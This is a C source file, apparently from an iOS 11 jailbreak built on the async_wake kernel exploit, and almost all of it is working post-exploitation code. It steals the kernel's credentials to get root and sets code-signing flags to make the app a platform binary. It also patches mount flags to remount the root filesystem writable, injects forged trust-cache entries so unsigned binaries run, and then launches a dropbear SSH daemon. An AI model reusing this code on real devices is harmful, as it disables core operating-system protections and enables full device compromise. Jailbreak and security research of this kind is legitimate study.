//
//  root.c
//  async_wake_ios
//
//  Created by Etienne Stalmans on 14/12/2017.
//  Copyright © 2017 Ian Beer. All rights reserved.
//
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <dirent.h>
#include <sys/fcntl.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <spawn.h>
#include <mach-o/loader.h>
#include <CommonCrypto/CommonDigest.h>

#include "kdbg.h"
#include "kutils.h"
#include "kmem.h"
#include "symbols.h"
#include "kcall.h"
#include "find_port.h"
#include "root.h"

// Thanks to
// Abraham Masri @cheesecakeufo https://gist.github.com/iabem97/d11e61afa7a0d0a9f2b5a1e42ee505d8
// @benjibobs https://github.com/benjibobs/async_wake
// This is all based off of their code and commented with my understanding of what is going on

// this is essentially the exact same function as
// uint64_t find_kernel_vm_map(uint64_t task_self_addr) {
// found in async_wake.c:437
// but we return the bsd_info rather than the vm_map
uint64_t get_process_bsdinfo(uint32_t pid) {
    
    // task_self_addr points to the struct ipc_port for our task port
    uint64_t task_self = task_self_addr();
    // read the address of the task struct
    uint64_t struct_task = rk64(task_self + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    
    //loop through the task structures to find the task structure for the supplied pid
    while (struct_task != 0 ) {
        // from async_wake.c:440 - where Ian loops to find the kernel vm_map
        uint64_t bsd_info = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
        uint32_t tpid = rk32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
        
        if (tpid == pid) {
            return bsd_info;
        }
        struct_task = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_PREV));
    }
   
    return -1;
}

uint64_t get_process_bsdinfo_from_name(char* procname){
    
    // task_self_addr points to the struct ipc_port for our task port
    uint64_t task_self = task_self_addr();
    // read the address of the task struct
    uint64_t struct_task = rk64(task_self + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    
    //loop through the task structures to find the task structure for the supplied pid
    while (struct_task != 0 ) {
        // from async_wake.c:440 - where Ian loops to find the kernel vm_map
        uint64_t bsd_info = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
        
        // create a buffer to hold the process name
        char buff [strlen(procname)];
        // read the process name, we only read of strlen("target process")
        rkbuffer(bsd_info+koffset(KSTRUCT_OFFSET_PROC_COMM),buff,(uint32_t)strlen(procname));
        
        //check if it is the pocess we are looking for
        if (strcmp(procname, buff) == 0) {
            return bsd_info;
        }
        struct_task = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_PREV));
    }
    
    return -1;
}

//get the current value of cflags for a given process.
//requires the memory location of the cflags, use get_csflags_loc to retrieve this
uint32_t get_csflags(uint32_t pid){
    uint32_t csflags = 0;
    uint64_t proc = rk64(find_allproc());
    while (proc) {
        uint32_t pi = rk32(proc + koffset(KSTRUCT_OFFSET_PROC_PID));
        if (pid == pi) {
            csflags = rk32(proc + koffset(KSTRUCT_OFFSET_CFLAGS));
            break;
        }
        proc = rk64(proc);
    }
    return csflags;
}

//sets the csflags of a process. Takes the memory location of the csflags to set
//get the memory location using get_csflags_loc
uint32_t set_csflags(uint32_t pid, uint32_t csflags){
    uint64_t proc = rk64(find_allproc());
    while (proc) {
        uint32_t pi = rk32(proc + koffset(KSTRUCT_OFFSET_PROC_PID));
        if (pid == pi) {
            uint32_t c_csflags = rk32(proc + koffset(KSTRUCT_OFFSET_CFLAGS));
            printf("Current csflags: 0x%08x\n",c_csflags);
            wk32(proc+koffset(KSTRUCT_OFFSET_CFLAGS), csflags);
            printf("New csflags: 0x%08x\n",csflags);
            break;
        }
        proc = rk64(proc);
    }
    return -1;
}

//steals the ucreds from the kernel process and applies them to our target
//pid. After which it should be possible to setuid(0) and get root.
void powerup(uint32_t pid){
    //get the process address for the current process
    printf("Get current process bsd_info\n");
    uint64_t proc_bsd = get_process_bsdinfo(pid);
    if(proc_bsd == -1) {
        printf("Failed to get current process bsd_info\n");
        return ;
    }
    printf("Got bsd_info: %llx\n", proc_bsd);
    
    //get process address for the kernel process
    printf("Get kernel process bsd_info\n");
    uint64_t kernel_bsd = get_process_bsdinfo(0);
    if(kernel_bsd == -1) {
        printf("Failed to get Kernel bsd_info\n");
        return ;
    }
    printf("Got bsd_info: %llx\n", kernel_bsd);
    
    /* KSTRUCT
     * been trying to find an example of what the structs look like
     *
     
     KSTRUCT
     +----------------------------+
     |                            |
     +----------------------------+         +----------------+--------+
     |        BSD_INFO            +-------> | Pid : bsd_info + 0x10   |
     |                            |         |                         |
     +----------------------------+         +-----------------+-------+
     |                            |         | ucred: bsd_info + 0x100 |
     |                            |         |                         |
     |                            |         +---------------------+---+
     |                            |         | Proc_name: bsd_info +   |
     |                            |         |            0x268        |
     |                            |         +--------------------+----+
     |                            |         | cs_flags: bsd_info +    |
     |                            |         |           0x2a8         |
     +----------------------------+         +-------------------------+
     
     
     * bsd_info + 0x100 - holds the user credentails struct
     * I think it is this -->
     * https://github.com/apple/darwin-xnu/blob/5394bb038891708cd4ba748da79b90a33b19f82e/bsd/sys/ucred.h
     *
     * we want to swap out the ucred struct to match that of the kernel. This means our process now has kernel permissions
     */
    //get the ucred from the kernel KStruct
    printf("Extract kernel ucred\n");
    uint64_t kernel_ucred = rk64(kernel_bsd + koffset(KSTRUCT_OFFSET_UCRED));
    printf("Found kernel_ucred: %llx\n", kernel_ucred);
    
    //overwrite the current ucred with the kernel's ucred
    printf("Replacing current ucred with kernel's\n");
    wk64(proc_bsd + koffset(KSTRUCT_OFFSET_UCRED) , kernel_ucred);
    printf("Successfully stole kern_ucred!\n");
}

//wrapper function that elevates the current process to root.
//returns the old uid so that we can drop privileges before exiting and prevent
//mitigations triggering.
uid_t get_root(mach_port_t tfpzero){
    setupKernelDump(tfpzero);
    
    uid_t olduid = getuid();
    printf("Current PID: %d, UID: %d\n",getpid(),olduid);
    
    //powerup the current process by stealing the kernel's ucreds
    powerup(getpid());
    
    //set our uid to root :D
    setuid(0);
    printf("PID: %d, UID: %d\n",getpid(), getuid());
    
    //return the olduid so we can reset it down the line
    return olduid;
}

//restore our uid to the previous uid
void reset_root(uid_t olduid){
    setuid(olduid);
    printf("Reset our UID\n");
    printf("PID: %d, UID: %d\n",getpid(), getuid());
}

void dirList(char* dir){
    DIR *dp;
    struct dirent *ep;
    dp = opendir(dir);
    if (dp != NULL){
        while (ep = readdir(dp)){
            printf("%s\n",ep->d_name);
        }
        (void)closedir(dp);
    } else {
        printf("Failed to open dir\n");
    }
}

uint32_t cpFile(char* source, char* destination){
    uint32_t counter = 0;
    
    int fd_src = open(source, O_RDONLY);
    if (fd_src < 0 ) {
        printf("Failed to open source: %s\n",source);
        return -1;
    }
    
    int fd_dst = open(destination, O_WRONLY | O_CREAT | O_EXCL, 0666);
    if (fd_dst < 0 ) {
        close(fd_src);
         printf("Failed to open dst: %s\n",destination);
        return -1;
    }
    char buf[4096];
    ssize_t nread;
    
    while (nread = read(fd_src, buf, sizeof buf), nread > 0)
    {
        char *out_ptr = buf;
        ssize_t nwritten;
        
        do {
            nwritten = write(fd_dst, out_ptr, nread);
            
            if (nwritten >= 0)
            {
                nread -= nwritten;
                out_ptr += nwritten;
                counter += nread;
            }
        } while (nread > 0);
    }

    
    close(fd_src);
    close(fd_dst);
    
    return counter;
}

void printFile(char* src) {
    FILE* fd = fopen(src, "r");
    if (fd < 0) {
        printf("Error opening file\n");
        return;
    }
    char ch;
    
    while( ( ch = fgetc(fd) ) != EOF )
        printf("%c",ch);
    fclose(fd);
    printf("\n");
}

void dumpBsd_Info(){
    uint32_t pid = getpid();
    // task_self_addr points to the struct ipc_port for our task port
    uint64_t task_self = task_self_addr();
    // read the address of the task struct
    uint64_t struct_task = rk64(task_self + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    
    //loop through the task structures to find the task structure for the supplied pid
    while (struct_task != 0 ) {
        // from async_wake.c:440 - where Ian loops to find the kernel vm_map
        uint64_t bsd_info = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
        uint32_t tpid = rk32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
        
        if (tpid == pid) {
            // create a buffer to hold the process name
            char buff [0x400];
            // read the process name, we only read of strlen("target process")
            rkbuffer(bsd_info,buff,(uint32_t)0x400);
            for(int i=0; i<0x400; i++){
                printf("0x%02x ",buff[i]);
            }
            break;
        }
        struct_task = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_PREV));
    }
}

void setPlatform(uint32_t pid){
    printf("Making app a platform app\n");
    uint32_t c_csflags = get_csflags(pid);
    c_csflags = (c_csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT  | CS_HARD);
    set_csflags(pid, c_csflags);
}

//parse a macho binary and find the
//this simply assumes a x64 macho since we are on iOS > 11
void* find_cs_blob(uint8_t* buf) {
    struct mach_header_64* hdr = (struct mach_header_64*)buf;
    
    uint32_t num_cmds = hdr->ncmds; //get the number of commands
    
    uint8_t* commands = (uint8_t*)(hdr+1);
    //iterate through the commands to find the LC_CODE_SIGNATURE
    for (uint32_t command_i = 0; command_i < num_cmds; command_i++) {
        
        struct load_command* lc = (struct load_command*)commands;
        
        if (lc->cmd == LC_CODE_SIGNATURE) {
            struct linkedit_data_command* cs_cmd = (struct linkedit_data_command*)lc;
            printf("LC_CODE_SIGNATURE found at offset +0x%x\n", cs_cmd->dataoff);
            return ((uint8_t*)buf) + cs_cmd->dataoff;
        }
        
        commands += lc->cmdsize;
    }
    return NULL;
}

//read file from disk into memory
void* readFile_mem(char* src, size_t* size){
    struct stat st = {0};
    //stat file to get it's size
    int e = stat(src, &st);
    if (e < 0 ){
        printf("Couldn't stat file, does it exist?\n");
        return NULL;
    }
    
    void* buff =  malloc(st.st_size);
    int fd = open(src,O_RDONLY);
    if (fd < 0) {
        printf("Couldn't read file... do you have permissions?");
        return NULL;
    }
    //read the file
    int r = read(fd, buff, st.st_size);
    if (r < st.st_size){
        printf("Failed to read full file\n");
        return NULL;
    }
    *size = st.st_size;
    
    return buff;
}

//create the SHA256 hash
void hash_cd_256(uint8_t* buff,uint8_t *hash_out){
    uint32_t* code_dir_int = (uint32_t*)buff;
    
    uint32_t realsize = 0;
    for (int j = 0; j < 10; j++) {
        if (htonl(code_dir_int[j]) == 0xfade0c02) {
            realsize = htonl(code_dir_int[j+1]);
            buff += 4*j;
        }
    }
    CC_SHA256(buff, realsize, hash_out);
}

int remountRW(){
    // Remount / as rw - patch by xerub
    // and modified by @ninjaprawn - https://github.com/ninjaprawn/async_awake-fun/blob/master/async_wake_ios/the_fun_part/fun.c
    {
        vm_offset_t off = 0xd8;
        uint64_t _rootvnode = find_rootvnode();
        uint64_t rootfs_vnode = rk64(_rootvnode);
        uint64_t v_mount = rk64(rootfs_vnode + off);
        uint32_t v_flag = rk32(v_mount + 0x71);
        
        wk32(v_mount + 0x71, v_flag & ~(1 << 6));
        
        char *nmz = strdup("/dev/disk0s1s1");
        int rv = mount("hfs", "/", MNT_UPDATE, (void *)&nmz);
        printf("remounting: %d\n", rv);
        
        v_mount = rk64(rootfs_vnode + off);
        wk32(v_mount + 0x71, v_flag);
        
        //try write to root and see if we have successfully remounted RW
        int fd = open("/.staaldraad", O_RDONLY);
        if (fd == -1) {
            fd = creat("/.staaldraad", 0444);
        } else {
            printf("File already exists!\n");
        }
        close(fd);
        //try open again and if success, file was created on /
        fd = open("/.staaldraad", O_RDONLY);
        if (fd == -1) {
            printf("File doesn't exist... we must have failed!!\n");
            return -1;
        } else {
            //it exists! print message and cleanup
            printf("File exists! We have RW on /\n");
            remove("/.staaldraad");
        }
        close(fd);
        rv = mount("hfs", "/Developer", MNT_UPDATE, (void *)&nmz);
    }
    return 0;
}

char* appendString(char *str1, char *str2){
    char * new_str ;
    if((new_str = malloc(strlen(str1)+strlen(str2)+1)) != NULL){
        new_str[0] = '\0';   // ensures the memory is an empty string
        strcat(new_str,str1);
        strcat(new_str,str2);
    }
    return new_str;
}

//based on injecttrust by stek29
int trustBin(const char *bin){
    printf("Injecting trust for application: %s\n",bin);
    size_t size = 0;
    uint8_t* file_buf = readFile_mem(bin, &size);
    if (size == 0) {
        return -1;
    }
    void* cs_blob = find_cs_blob(file_buf);
    uint8_t* cs_hash = malloc(CC_SHA256_DIGEST_LENGTH);
    hash_cd_256(cs_blob, cs_hash);
    
    typedef char hash_t[20];
    
    struct trust_chain {
        uint64_t next;                 // +0x00 - the next struct trust_mem
        unsigned char uuid[16];        // +0x08 - The uuid of the trust_mem (it doesn't seem important or checked apart from when importing a new trust chain)
        unsigned int count;            // +0x18 - Number of hashes there are
        hash_t hash[1];                // +0x1C - The hashes
    };
    
    uint64_t tc = find_trustcache();
    struct trust_chain fake_chain;
    
    static uint64_t last_injected = 0;
    
    fake_chain.next = rk64(tc);
    *(uint64_t *)&fake_chain.uuid[0] = 0xfffffffff0000000;
    *(uint64_t *)&fake_chain.uuid[8] = 0xfffffffff0000000;
    fake_chain.count = 1;
    
    memmove(fake_chain.hash[0], cs_hash, 20);
    free(cs_hash);
    
    uint64_t kernel_trust = kalloc(sizeof(fake_chain));
    kwrite(kernel_trust, &fake_chain, sizeof(fake_chain));
    last_injected = kernel_trust;
    
    wk64(tc, kernel_trust);
    
    return 1;
}

uint32_t startBin(const char *bin,const char* args[]){
    //inject trust
    if (trustBin(bin) == -1){
        return 0;
    }
    
    printf("Spawning binary application: %s\n",bin);
    int pid;
    int rv = posix_spawn(&pid, bin, NULL, NULL, (char**)args, NULL);
    printf("Application started, has pid: %d, rv=%d\n",pid,rv);
    
    sleep(5);
    return pid;
}

void copyFiles(char *cwd){
    printf("App directory: %s\n",cwd);
    //copy tar and dropbear to the root
    //and extract :D
    //make a new directory for this
    mkdir("/staaldraad/", 0755);
    cpFile(appendString(cwd,"/tar"), "/staaldraad/tar");
    chmod("/staaldraad/tar", 0777);
    cpFile(appendString(cwd,"/bearbins.tar"), "/staaldraad/bearbins.tar");
    cpFile(appendString(cwd,"/setenv"), "/staaldraad/setenv.sh");
    dirList("/staaldraad/");
    //call untar
    startBin("/staaldraad/tar", (char **)&(const char*[]){"/staaldraad/tar","-xpf","/staaldraad/bearbins.tar", "-C", "/staaldraad",NULL});

    //inject trust into all new binaries
    char buf[1024];
    
    FILE * fp = fopen("/staaldraad/binlist.txt", "r");
    if (fp == NULL)
        return;

    while (fgets(buf, sizeof(buf), fp) != NULL)
    {
        buf[strlen(buf) - 1] = '\0'; // eat the newline fgets() stores
        trustBin(appendString("/staaldraad/",buf));
    }
    fclose(fp);

    
}

int startSSH(){
    //start SSHD
    int pi = startBin("/staaldraad/usr/local/bin/dropbear", (char **)&(const char*[]){"/staaldraad/usr/local/bin/dropbear","-E", "-m", "-F", "-S", "/" "staaldraad",NULL});
    //make sure app has started before trying to privesc
    
    //so get_process_bsdinfo doesn't work for this process
    //using find_allproc from patchfinder64.c does the trick though
    
    //waitpid(pi, NULL,0);
    return pi;
}

